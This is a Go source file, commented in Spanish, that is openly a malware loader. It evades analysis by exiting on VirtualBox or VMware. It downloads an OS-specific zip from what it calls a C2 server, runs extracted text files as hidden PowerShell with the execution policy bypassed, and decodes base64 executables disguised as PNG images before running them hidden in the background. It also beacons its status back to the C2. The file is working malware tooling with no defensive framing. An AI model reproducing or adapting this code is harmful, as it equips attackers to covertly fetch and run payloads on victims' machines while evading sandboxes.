package main

import (
	"archive/zip"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
)

// Detecta si el sistema está virtualizado (VMware o VirtualBox)
func isVirtualized() bool {
	cmd := exec.Command("wmic", "computersystem", "get", "model")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	outStr := strings.ToLower(string(output))
	if strings.Contains(outStr, "virtualbox") || strings.Contains(outStr, "vmware") {
		return true
	}
	return false
}

// Detecta si está ejecutándose en Linux
func isLinux() bool {
	return runtime.GOOS == "linux"
}

// Descarga el archivo .zip desde el servidor C2
func downloadFile(url string, filepath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

// Descomprime un archivo .zip
func unzipFile(zipFile, destDir string) error {
	r, err := zip.OpenReader(zipFile)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {
		filePath := destDir + "/" + f.Name
		if f.FileInfo().IsDir() {
			os.MkdirAll(filePath, os.ModePerm)
			continue
		}
		err := unzipSingleFile(f, filePath)
		if err != nil {
			return err
		}
	}
	return nil
}

// Descomprime un único archivo dentro del archivo .zip
func unzipSingleFile(f *zip.File, destPath string) error {
	srcFile, err := f.Open()
	if err != nil {
		return err
	}
	defer srcFile.Close()

	destFile, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)
	return err
}

// Ejecuta los comandos en archivos de texto numerados
func executeTxtCommands(folder string) {
	for i := 1; i <= 3; i++ {
		filename := fmt.Sprintf("%s/%d.txt", folder, i)
		file, err := os.Open(filename)
		if err != nil {
			fmt.Println("Error abriendo el archivo:", err)
			continue
		}

		content, err := ioutil.ReadAll(file)
		if err != nil {
			fmt.Println("Error leyendo el archivo:", err)
			file.Close()
			continue
		}
		file.Close()

		fmt.Printf("Ejecutando el comando del archivo %d.txt: %s\n", i, string(content))
		output, err := executePowerShellCommand(string(content))
		if err != nil {
			fmt.Println("Error ejecutando el comando:", err)
		} else {
			fmt.Println("Salida:", string(output))
		}
	}
}

// Función para ejecutar el comando PowerShell
func executePowerShellCommand(comando string) ([]byte, error) {
	c := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", comando)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := c.CombinedOutput()
	return output, err
}

// Lee el contenido base64 de una imagen PNG
func extractBase64FromPng(pngPath string) (string, error) {
	data, err := ioutil.ReadFile(pngPath)
	if err != nil {
		return "", err
	}

	// Aquí asumimos que el contenido Base64 está contenido como un string en el archivo
	return string(data), nil
}

// Decodifica el contenido Base64 y ejecuta el .exe en memoria
func decodeAndExecuteBase64Exe(base64Content string) error {
	// Decodificar el contenido Base64
	exeData, err := base64.StdEncoding.DecodeString(base64Content)
	if err != nil {
		return err
	}

	// Escribe el contenido del .exe decodificado en un archivo temporal
	tempExePath := "C:\\temp_executable.exe"
	err = ioutil.WriteFile(tempExePath, exeData, 0755)
	if err != nil {
		return fmt.Errorf("error al escribir el archivo .exe temporal: %v", err)
	}

	// Ejecutar el archivo temporal .exe en segundo plano
	cmd := exec.Command(tempExePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Start() // Usamos Start para ejecutarlo en segundo plano
	if err != nil {
		return fmt.Errorf("error al ejecutar el archivo en memoria: %v", err)
	}

	fmt.Println("Archivo .exe ejecutado en segundo plano:", tempExePath)
	return nil
}

// Ejecutar los archivos .exe ocultos en las imágenes PNG
func executeExeFromPngs(folder string) {
	// Supongamos que hay tres imágenes PNG con archivos .exe ocultos
	for i := 4; i <= 6; i++ {
		pngPath := fmt.Sprintf("%s/%d.png", folder, i)

		// Verificar si la imagen PNG existe
		if _, err := os.Stat(pngPath); os.IsNotExist(err) {
			fmt.Println("Archivo PNG no encontrado:", pngPath)
			continue
		}

		base64Content, err := extractBase64FromPng(pngPath)
		if err != nil {
			fmt.Println("Error leyendo el archivo PNG:", err)
			continue
		}

		// Decodificar y ejecutar el .exe en memoria
		err = decodeAndExecuteBase64Exe(base64Content)
		if err != nil {
			fmt.Println("Error ejecutando el .exe desde PNG:", err)
		} else {
			fmt.Println("Archivo .exe ejecutado desde PNG:", pngPath)
		}
	}
}

// Función para notificar al C2 sobre el estado de la ejecución
func NotifyC2(status string) {
	_, err := http.Get("http://localhost:9090/notify?status=" + status)
	if err != nil {
		fmt.Println("Error al notificar al C2:", err)
	} else {
		fmt.Println("Notificación enviada al C2:", status)
	}
}

func main() {
	fmt.Println("Verificando entorno...")

	// Detecta si está en un entorno virtualizado
	if isVirtualized() {
		fmt.Println("Ejecutando en entorno virtualizado.")
		NotifyC2("virtualized")
		return
	}

	// Detecta si el sistema es Linux o Windows y descarga el archivo apropiado
	var url, filepath string
	if isLinux() {
		fmt.Println("Sistema operativo detectado: Linux.")
		url = "http://localhost:9090/list/m_linux.zip"
		filepath = "m_linux.zip"
	} else {
		fmt.Println("Sistema operativo detectado: Windows.")
		url = "http://localhost:9090/list/m_windows.zip"
		filepath = "m_windows.zip"
	}

	// Descargar el archivo zip desde el C2
	err := downloadFile(url, filepath)
	if err != nil {
		fmt.Println("Error descargando el archivo:", err)
		NotifyC2("failed")
		return
	}
	fmt.Println("Archivo descargado:", filepath)

	// Descomprimir el archivo zip
	destFolder := "extracted_files"
	err = unzipFile(filepath, destFolder)
	if err != nil {
		fmt.Println("Error descomprimiendo el archivo:", err)
		NotifyC2("failed")
		return
	}
	fmt.Println("Archivo descomprimido en:", destFolder)

	// Ejecutar los comandos desde los archivos de texto numerados
	executeTxtCommands(destFolder)

	// Ejecutar los archivos .exe ocultos en las imágenes PNG
	executeExeFromPngs(destFolder)

	NotifyC2("success")
}
